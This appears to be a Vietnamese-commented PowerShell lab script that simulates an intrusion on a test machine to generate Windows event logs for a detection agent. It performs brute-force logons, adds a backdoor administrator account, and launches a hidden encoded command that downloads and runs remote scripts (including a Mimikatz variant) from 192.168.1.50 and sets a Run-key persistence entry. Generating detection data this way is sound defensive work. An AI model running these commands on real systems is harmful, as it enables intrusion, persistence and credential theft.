# ==============================================================================
# SCRIPT CHAY TREN MAY THU NGHIEM / MAY LAB (STANDALONE DEMO RUNNER)
# ==============================================================================
# Script nay duoc thiet ke de COPY SANG MAY KHAC (VM / May Nan Nhan / May Lab)
# Tu dong giu cua so PowerShell mo, KHONG BAO GIO bi tu dong tat.
# ==============================================================================

# 1. Kiem tra quyen Administrator
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "====================================================================" -ForegroundColor Red
    Write-Host " [!] CANH BAO: BAN CHUA MO BANG QUYEN ADMINISTRATOR!" -ForegroundColor Yellow
    Write-Host "     Windows can quyen Administrator de doc Security Event Log (4624, 4625, 4688)." -ForegroundColor White
    Write-Host "====================================================================" -ForegroundColor Red
    Write-Host "`n>>> HUONG DAN CHAY:" -ForegroundColor Cyan
    Write-Host "    Click chuot phai vao file 'run_demo.bat' -> Chon 'Run as administrator'`n" -ForegroundColor Yellow
    cmd.exe /c pause
    exit
}

$ErrorActionPreference = "Continue"
$outputDir = "C:\demo"

try {
    # Tu dong tao thu muc C:\demo neu chua co
    if (-not (Test-Path $outputDir)) {
        New-Item -ItemType Directory -Force -Path $outputDir | Out-Null
    }

    Clear-Host
    Write-Host "====================================================================" -ForegroundColor Cyan
    Write-Host "     KICH BAN TAO EVENT LOG TAN CONG (CHAY TREN MAY THU NGHIEM)     " -ForegroundColor Yellow
    Write-Host "====================================================================" -ForegroundColor Cyan
    Write-Host "Thu muc xuat log: $outputDir" -ForegroundColor White
    Write-Host "====================================================================`n" -ForegroundColor Cyan

    # --------------------------------------------------------------------------
    # BUOC 0: BAT AUDIT POLICY BAT BUOC TREN WINDOWS
    # --------------------------------------------------------------------------
    Write-Host "[1/4] Dang cau hinh Audit Policy va Logging tren may nay..." -ForegroundColor Cyan

    auditpol /set /subcategory:"Logon" /success:enable /failure:enable 2>&1 | Out-Null
    auditpol /set /subcategory:"Process Creation" /success:enable 2>&1 | Out-Null
    reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f 2>&1 | Out-Null
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v EnableScriptBlockLogging /t REG_DWORD /d 1 /f 2>&1 | Out-Null

    Write-Host "  -> Da bat Audit Logon (4624/4625), Process Creation (4688), va ScriptBlock (4104)." -ForegroundColor Green

    # --------------------------------------------------------------------------
    # BUOC 1 DEN 5: MO PHONG CHUOI TAN CONG
    # --------------------------------------------------------------------------
    Write-Host "`n[2/4] Bat dau thuc thi 5 buoc mo phong..." -ForegroundColor Cyan

    $startUtc = (Get-Date).ToUniversalTime()
    $queryStartTime = (Get-Date).AddMinutes(-5)

    net user lab_demo P@ssRealDemo2026! /add /y 2>&1 | Out-Null

    # --- GIAI DOAN 1: Do mat khau (Event 4625 x 5 lan) ---
    Write-Host "`n>>> [BUOC 1] Thuc hien Password Brute Force (5 lan sai mat khau)..." -ForegroundColor Yellow
    $fakePasswords = @("123456", "admin123", "password", "demo2026", "qwerty")
    foreach ($pass in $fakePasswords) {
        Write-Host "  [+] Thu mat khau '$pass' -> " -NoNewline -ForegroundColor Gray
        net use \\127.0.0.1 /user:lab_demo $pass 2>&1 | Out-Null
        Write-Host "DANG NHAP THAT BAI (Sinh Event 4625)" -ForegroundColor Red
        Start-Sleep -Milliseconds 800
    }

    # --- GIAI DOAN 2: Dang nhap thanh cong (Event 4624) ---
    Write-Host "`n>>> [BUOC 2] Dang nhap thanh cong sau chuoi do pass..." -ForegroundColor Green
    Write-Host "  [+] Dang nhap bang mat khau dung -> " -NoNewline -ForegroundColor Gray
    net use \\127.0.0.1 /user:lab_demo P@ssRealDemo2026! 2>&1 | Out-Null
    Write-Host "DANG NHAP THANH CONG (Sinh Event 4624)" -ForegroundColor Green
    Start-Sleep -Seconds 1

    # --- GIAI DOAN 3: Trinh sat he thong (Event 4688 whoami) ---
    Write-Host "`n>>> [BUOC 3] Ke tan cong trinh sat he thong..." -ForegroundColor Cyan
    Write-Host "  [+] Thuc thi: cmd.exe /c whoami" -ForegroundColor Gray
    cmd.exe /c whoami | Out-Null
    Start-Sleep -Seconds 1

    # --- GIAI DOAN 4: Tao backdoor va leo thang Admin (Event 4688) ---
    Write-Host "`n>>> [BUOC 4] Tao backdoor va them quyen Admin..." -ForegroundColor Magenta
    Write-Host "  [+] net user hacker P@ssw0rd123! /add" -ForegroundColor Gray
    cmd.exe /c "net user hacker P@ssw0rd123! /add" 2>&1 | Out-Null
    Start-Sleep -Seconds 1

    Write-Host "  [+] net localgroup Administrators hacker /add" -ForegroundColor Gray
    cmd.exe /c "net localgroup Administrators hacker /add" 2>&1 | Out-Null
    Start-Sleep -Seconds 1

    # --- GIAI DOAN 5: Thuc thi ma doc PowerShell (Event 4688 va 4104) ---
    Write-Host "`n>>> [BUOC 5] Thuc thi ma doc an va tai payload tu C2..." -ForegroundColor Red
    $payloadScript = "iex (New-Object Net.WebClient).DownloadString('http://192.168.1.50/payload.ps1'); Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Updater' -Value 'C:\Windows\Temp\svchost32.exe'; Invoke-Expression (New-Object Net.WebClient).DownloadString('http://192.168.1.50/mimikatz_lite.ps1')"
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($payloadScript)
    $encodedCommand = [Convert]::ToBase64String($bytes)

    Write-Host "  [+] powershell.exe -NoP -W Hidden -Exec Bypass -EncodedCommand [Base64]" -ForegroundColor Gray
    Start-Process -FilePath "powershell.exe" -ArgumentList "-NoP -NonI -W Hidden -Exec Bypass -EncodedCommand $encodedCommand"
    Start-Sleep -Seconds 2

    # Don dep tai khoan sau khi test
    net use \\127.0.0.1 /delete /y 2>&1 | Out-Null
    net user hacker /delete 2>&1 | Out-Null
    net user lab_demo /delete 2>&1 | Out-Null

    $endUtc = (Get-Date).ToUniversalTime()

    # --------------------------------------------------------------------------
    # BUOC 3: DOI WINDOWS FLUSH LOG
    # --------------------------------------------------------------------------
    Write-Host "`n[3/4] Doi 3 giay de Windows Event Log dong bo du lieu..." -ForegroundColor Yellow
    Start-Sleep -Seconds 3

    # --------------------------------------------------------------------------
    # BUOC 4: TRICH XUAT EVENT LOGS RA C:\demo
    # --------------------------------------------------------------------------
    Write-Host "`n[4/4] Dang trich xuat log vao $outputDir..." -ForegroundColor Cyan

    # 1. Trich xuat Security Log (4624, 4625, 4688)
    $rawSec = Get-WinEvent -FilterHashtable @{
        LogName   = 'Security'
        Id        = 4624, 4625, 4688
        StartTime = $queryStartTime
    } -ErrorAction SilentlyContinue

    $secCount = if ($rawSec) { $rawSec.Count } else { 0 }
    if ($secCount -gt 0) {
        Write-Host "  [V] Security Log : Trich xuat duoc $secCount su kien (4624, 4625, 4688)" -ForegroundColor Green
        $secXml = "<Events>" + (($rawSec | ForEach-Object { $_.ToXml() }) -join "") + "</Events>"
    } else {
        Write-Host "  [X] CANH BAO: Khong tim thay su kien Security nao!" -ForegroundColor Red
        $secXml = "<Events></Events>"
    }
    [System.IO.File]::WriteAllText("$outputDir\security.xml", $secXml, [System.Text.Encoding]::UTF8)

    # 2. Trich xuat PowerShell Log (4104 ScriptBlock)
    $rawPs = Get-WinEvent -FilterHashtable @{
        LogName   = 'Microsoft-Windows-PowerShell/Operational'
        Id        = 4104
        StartTime = $queryStartTime
    } -ErrorAction SilentlyContinue

    $psCount = if ($rawPs) { $rawPs.Count } else { 0 }
    if ($psCount -gt 0) {
        Write-Host "  [V] PowerShell   : Trich xuat duoc $psCount su kien (4104 ScriptBlock)" -ForegroundColor Green
        $psXml = "<Events>" + (($rawPs | ForEach-Object { $_.ToXml() }) -join "") + "</Events>"
    } else {
        Write-Host "  [!] PowerShell   : Khong co su kien 4104 moi." -ForegroundColor Yellow
        $psXml = "<Events></Events>"
    }
    [System.IO.File]::WriteAllText("$outputDir\powershell.xml", $psXml, [System.Text.Encoding]::UTF8)

    # 3. Tao file manifest.json
    $manifest = @{
        case_id      = "case_demo"
        host         = $env:COMPUTERNAME
        start_utc    = $startUtc.ToString("yyyy-MM-ddTHH:mm:ssZ")
        end_utc      = $endUtc.ToString("yyyy-MM-ddTHH:mm:ssZ")
        actions      = "5x Brute Force; 1x Logon Success; whoami; net user hacker /add; PowerShell Cradle + Mimikatz"
        ground_truth = "ALERT"
    } | ConvertTo-Json -Depth 3
    [System.IO.File]::WriteAllText("$outputDir\manifest.json", $manifest, [System.Text.Encoding]::UTF8)

    Write-Host "`n====================================================================" -ForegroundColor Green
    Write-Host "                     HOAN TAT THANH CONG!                           " -ForegroundColor Yellow
    Write-Host "====================================================================" -ForegroundColor Green
    Write-Host "Da xuat day du 3 file vao thu muc $outputDir :" -ForegroundColor White
    Write-Host "  1. $outputDir\security.xml" -ForegroundColor Cyan
    Write-Host "  2. $outputDir\powershell.xml" -ForegroundColor Cyan
    Write-Host "  3. $outputDir\manifest.json" -ForegroundColor Cyan
    Write-Host "`n[*] BUOC TIEP THEO:" -ForegroundColor Yellow
    Write-Host "    Copy ca thu muc '$outputDir' nay ve may chay AI Agent (vi du C:\LabExport), roi chay trong winlog-agent:" -ForegroundColor White
    Write-Host "    .\.venv\Scripts\python.exe -m app.import_logs --data-root data/local --security C:\LabExport\security.xml --powershell C:\LabExport\powershell.xml" -ForegroundColor Cyan
    Write-Host "    .\.venv\Scripts\python.exe -m app.cases IMPORT_ID --data-root data/local" -ForegroundColor Cyan
    Write-Host "    .\.venv\Scripts\python.exe -m app.baseline_rules IMPORT_ID --data-root data/local" -ForegroundColor Cyan
    Write-Host "====================================================================" -ForegroundColor Green

} catch {
    Write-Host "`n[!] DA XAY RA LOI TRONG QUA TRINH CHAY: $_" -ForegroundColor Red
    Write-Host $_.ScriptStackTrace -ForegroundColor DarkRed
} finally {
    Write-Host "`n====================================================================" -ForegroundColor Yellow
    Write-Host ">>> [HOAN TAT] Tat ca log da duoc luu tai: $outputDir" -ForegroundColor Green
    Write-Host ">>> Cua so nay se DUOC GIU NGUYEN (KHONG TU DONG DONG)." -ForegroundColor Cyan
    Write-Host "====================================================================" -ForegroundColor Yellow
    cmd.exe /c pause
}
